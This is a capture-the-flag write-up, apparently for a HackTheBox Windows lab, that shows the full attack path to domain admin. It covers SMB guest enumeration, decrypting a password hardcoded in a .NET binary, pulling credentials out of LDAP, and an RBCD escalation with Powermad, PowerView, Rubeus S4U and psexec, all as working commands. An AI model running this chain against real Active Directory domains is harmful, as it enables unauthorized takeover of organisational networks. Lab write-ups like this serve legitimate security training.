---
# SUPPORT -- Windows

---
## Enumeration

---
### NMAP
```
sudo nmap -Pn -sCV 10.129.230.181 -vvv -min-rate 8888 -oN tcp.nmap
```
<img width="603" height="302" alt="image" src="https://github.com/user-attachments/assets/72d9bc7d-1ea5-43b2-914f-70e27d3c7edf" />



---
### NETEXEC
```
netexec smb 10.129.230.181 -u guest -p '' --shares
```
<img width="594" height="328" alt="image" src="https://github.com/user-attachments/assets/df66de00-4ad5-4ef5-8d37-0278dccc2ada" />

```
netexec smb 10.129.230.181 -u guest -p '' --rid-brute
```

<img width="599" height="610" alt="image" src="https://github.com/user-attachments/assets/0c38c134-4917-4f10-a753-839ed963066d" />

```
cat users.txt | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users
```

//Then save users into a file


<img width="472" height="264" alt="image" src="https://github.com/user-attachments/assets/2a1edf65-6c91-410d-bf4a-3568effba7d0" />


---
### SMBCLIENT

```
smbclient -L //10.129.230.181/support-tools -U 'guest%'
```

```
smbclient //10.129.230.181/support-tools -U 'guest%' 
```

<img width="641" height="428" alt="image" src="https://github.com/user-attachments/assets/61943f01-a9a1-44c7-9926-9dd8ef4f6f05" />

//then we `get UserInfo.exe.zip` because the rest is likely public tools -- best not to clutter our system


---
### IMPACKET-GETNPUSERS

```
impacket-GetNPUsers -request -usersfile users support.htb/
```
//no luck here


---
## EXPLOITATION

---
### DNSPY

//get dnSpy here `https://github.com/dnSpy/dnSpy/releases`
//drop UserInfo.exe into dnspy -- see what we can uncover

<img width="1037" height="471" alt="image" src="https://github.com/user-attachments/assets/0863dc4f-b615-4ac4-94ce-ec3ff1b65e20" />

//and found a potential encrypted password `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E` with `armando` as key



```
public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}
```


//we could write a python script to decrypt this

```
import base64

def get_password(enc_password_b64, key_bytes):
    # 1. Decode the base64 encrypted password string into bytes
    encrypted_bytes = base64.b64decode(enc_password_b64)
    
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    
    # 2. Replicate the C# loop and XOR math
    for i in range(len(encrypted_bytes)):
        # array[i] ^ Protected.key[i % Protected.key.Length] ^ 223
        decrypted_byte = encrypted_bytes[i] ^ key_bytes[i % key_length] ^ 223
        decrypted_bytes.append(decrypted_byte)
        
    # 3. Convert the byte array back to a standard string
    return decrypted_bytes.decode('utf-8', errors='ignore')

ENC_PASSWORD = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
KEY = b"armando"  # Keep the 'b' prefix to treat it as bytes

print(get_password(ENC_PASSWORD, KEY))
```


<img width="278" height="55" alt="image" src="https://github.com/user-attachments/assets/ed57c27f-d43c-432d-9170-523b721d8069" />


//and got this `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

```
netexec smb 10.129.230.181 -u users -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --continue-on-success
```
//strangely, we got no hit.\n
//earlier there were 2 other users `ldap` and `support` from netexec -- let's try them as well

```
netexec smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --continue-on-success
```

//sure enough it's a hit on ldap user

<img width="599" height="113" alt="image" src="https://github.com/user-attachments/assets/0d3078b9-02f6-483d-9e65-9226d0835795" />


//now that we got creds -- let's check shares again

```
netexec smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
```

<img width="598" height="377" alt="image" src="https://github.com/user-attachments/assets/e41810db-d9c7-4438-97fd-bdc601645dfe" />

//looks default



---
### IMPACKET-GETUSERSPNS

```
impacket-GetUserSPNs support.htb/'ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -dc-ip 10.129.230.181 -request
```
//no hit -- no surprises there



---
### BLOODHOUND-CE-PYTHON


//first run bloodhound-ce-python to collect data


```
bloodhound-ce-python -c all -d support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -dc support.htb -ns 10.129.230.181 --auth-method ntlm --zip
```

<img width="596" height="307" alt="image" src="https://github.com/user-attachments/assets/cfb84328-5b80-4952-8bf6-d359e3e899a7" />


//now run `bloodhound`


//this should pop up a new browser tab or window -- go ahead and log in -- and upload the zip file


<img width="896" height="304" alt="image" src="https://github.com/user-attachments/assets/a3415e4d-d8ea-43bb-9c1d-ec99925d9bb8" />


//apparently there's nothing immediately exploitable here. We move on.




---
### LDAPSEARCH


//let's use ldapsearch to glean through AD objects


```
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```


//a lot to sort through -- but eventually found this on user support `Ironside47pleasure40Watchful`


<img width="473" height="293" alt="image" src="https://github.com/user-attachments/assets/fa92c65c-193a-46b3-a6d2-2251d1c7daf0" />


```
netexec smb 10.129.7.161 -u support -p 'Ironside47pleasure40Watchful' --continue-on-success
```

```
netexec winrm 10.129.7.161 -u support -p 'Ironside47pleasure40Watchful' --continue-on-success
```

//sure enough it's valid

//and when we try winrm -- we got a pwned! -- meaning we should be in remote management user and or an administrator


<img width="599" height="316" alt="image" src="https://github.com/user-attachments/assets/867db39a-eb92-43fb-9317-46afce3cf5b2" />






---
### BLOODHOUND-CE-PYTHON


```
bloodhound-ce-python -c all -d support.htb -u support -p 'Ironside47pleasure40Watchful' -dc support.htb -ns 10.129.7.161 --auth-method ntlm --zip
```

//check bloodhound real quick before leveraging evil-winrm


<img width="603" height="310" alt="image" src="https://github.com/user-attachments/assets/a0d7003a-e587-402d-8594-2105bc84ab0a" />


//looks like we're in a shared support account


<img width="1146" height="275" alt="image" src="https://github.com/user-attachments/assets/0b52ffee-18a9-4a14-aebf-612d5de741ad" />


//and we have genericall over DC -- a compromise may be close at hand


<img width="1032" height="183" alt="image" src="https://github.com/user-attachments/assets/3e950b62-8c11-4c50-962d-ee57275743c3" />



---
### EVIL-WINRM


```
evil-winrm -i 10.129.7.161 -u support -p 'Ironside47pleasure40Watchful'
```

```
tree /a /f \users
```

//we're in -- and got user


<img width="603" height="505" alt="image" src="https://github.com/user-attachments/assets/7a525eea-d607-4af1-93c3-1a472365c08a" />




---
## PRIVESC


```
whoami /priv
```

//we got `SeMachineAccountPrivilege` -- would come in handy if we abuse RBCD



```
cmd /c sc query windefend
```

```
get-service windefend
```

```
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
```

//check and apparently Defender is not present on this machine


<img width="599" height="303" alt="image" src="https://github.com/user-attachments/assets/ab295b07-6659-4f33-bc9d-52ab3a5f8e6d" />



---
### RBCD

//so we will privesc via resource-based constrained delegation
//another path is shadow creds


```
upload ~/pwview.txt
```

```
upload ~/pwmad.txt
```

```
upload ~/ru4.6.scr
```

//get powerview, powermad, and rubeus over to target


<img width="554" height="589" alt="image" src="https://github.com/user-attachments/assets/239c59de-1526-413a-bb9f-e0a521e479b8" />



//then `move` powermad, powerview, and rubeus back .ps1 and .exe respectively


```
. .\mad.ps1
```
```
. .\view.ps1
```
```
New-MachineAccount -MachineAccount eghtsystem -Password $(ConvertTo-SecureString 'Summer2088!' -AsPlainText -Force)
```
```
$ComputerSid = Get-DomainComputer eghtsystem -Properties objectsid | Select -Expand objectsid
```
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
```
```
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```
```
$SD.GetBinaryForm($SDBytes, 0)
```
```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

//exploit steps are available on the bloodhound GUI


<img width="603" height="290" alt="image" src="https://github.com/user-attachments/assets/d1f42497-4b71-4b78-9e2a-7629de8cb58f" />


```
.\ru.exe hash /password:Summer2088!
```

//get RC4 hash for our password


<img width="550" height="255" alt="image" src="https://github.com/user-attachments/assets/d60183e3-be76-4821-a068-8e7886523ff2" />


```
.\ru.exe s4u /user:eghtsystem$ /rc4:5A1537E5EFB70A2D03F364BD778023A6 /impersonateuser:administrator /msdsspn:cifs/DC.support.htb /ptt
```

//run rubeus s4u mode to get a ticket impersonating administrator


<img width="600" height="362" alt="image" src="https://github.com/user-attachments/assets/74fd70a2-d5e3-4c03-89e4-af2afa1e6267" />


```
klist
```

//and it appears that we have a working ticket


<img width="595" height="258" alt="image" src="https://github.com/user-attachments/assets/b3cac544-bcac-493b-a705-f6c17eecea27" />


```
dir \\DC.support.htb\c$\users\administrator\desktop
```

//test our access as DC administrator -- but for some reason it doesn't work -- we got an access-denied


<img width="611" height="107" alt="image" src="https://github.com/user-attachments/assets/ca7b0d90-d542-4afa-affb-5b785b54b092" />



---
### IMPACKET-TICKETCONVERTER


//we could alternatively convert .kirbi ticket into ccache so we can use it on our kali


//but first, let's dump our .kirbi ticket in base64 using rubeus


```
.\ru dump /nowrap
```

<img width="604" height="112" alt="image" src="https://github.com/user-attachments/assets/41700bf0-610c-496b-901e-fe093103988f" />


//save our b64 ticket in a text editor -- I perfer vim


```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```
```
impacket-ticketConverter ticket.kirbi ticket.ccache
```
```
export KRB5CCNAME=ticket.ccache
```

<img width="539" height="191" alt="image" src="https://github.com/user-attachments/assets/a3ea062d-4218-4373-b848-ad7f2f09cfea" />


---
### IMPACKET-PSEXEC

```
impacket-psexec -k -no-pass 'support.htb/administrator@DC.support.htb'
```

//leveraging psexec to seal the deal

//and we're done


<img width="530" height="280" alt="image" src="https://github.com/user-attachments/assets/31f0a959-37b1-43a2-a144-c945e5bb2043" />



